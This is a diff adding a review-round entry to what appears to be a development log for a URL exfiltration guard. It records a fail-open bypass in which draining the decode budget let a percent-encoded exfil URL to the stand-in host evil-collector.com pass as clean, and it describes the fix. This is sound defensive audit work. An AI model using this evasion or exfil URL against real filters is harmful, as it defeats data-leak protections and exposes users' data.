@@ -2901,3 +2901,35 @@ launder-allowlist-only, payload-empty, no-progressive-decode), file restored
 byte-identical. Full suite green (22 pkgs), guard race-clean. Net line count
 dropped vs r15 (two code paths → one). **Re-review of r16 is the next round;
 the fixpoint clock stays reset (r16 is a rewrite of the nested path).**
+
+## Guard slice — r17 (2026-08-22): r16 re-review → one HIGH, fixed to green
+
+Opus re-review of r16 (the fixpoint-discipline round on a security gate).
+**One real HIGH; everything else HELD under hard effort** — the reviewer's
+negative results are as valuable as the finding:
+- DoS BOUNDED: 520KB/10MB/3.2MB/8.8MB adversarial inputs all ~1s (r16 budget
+  holds; the O(k³)→83s regression is genuinely gone).
+- Parse-budget fails CLOSED correctly (drain then direct exfil → flags).
+- Prefilter SOUND: a fresh 500k-case differential fuzz, 0 mismatches
+  (independent of r15's 400k run).
+- Parity: Go policy is a strict superset of Python's weak regex.
+
+**HIGH (r16's own new code, again the flagship pattern — but bounded, not
+churn): decode-budget exhaustion failed OPEN.** r16's `decode()` returned the
+input unchanged when `decodeBytes` hit 0, which `scanNested` read as clean. A
+percent-encoded inner scheme (`https%3A…`) is invisible to schemeRe until
+decoded, so an attacker who drains the decode budget with large no-`%` payloads
+(r16 charged every payload) and then appends `https://r.jina.ai/https%3A%2F%2F
+evil-collector.com%2Fleak-data-here` got a CLEAN verdict on a real exfil
+(reproduced: 1.2MB → clean=true; evil alone → high). Fix (r17): (1) a payload
+with no `%` left is fully examined — return clean WITHOUT charging the budget
+(kills the drain vector); (2) budget exhaustion with `%` still present flags
+`scan-budget-exhausted` (fail-closed, matching parse-budget/oversized posture).
+Both drain vectors now flag high and stay fast (114ms / 344ms). Pin
+TestURLDecodeBudgetFailsClosed; mutation M108 (fail-open revert) DETECTED (M109,
+charge-no-`%`, is not independently security-load-bearing — the fail-closed path
+catches the drain regardless, correct defense-in-depth). Full suite green (22
+pkgs), guard race-clean. Verify-before-fix honored. **This is a bounded new-
+surface finding inside r16's budget code, not churn: the parser core and DoS
+bound held; r17 closes the last resource-exhaustion seam. A clean r18 re-review
+would be fixpoint.**
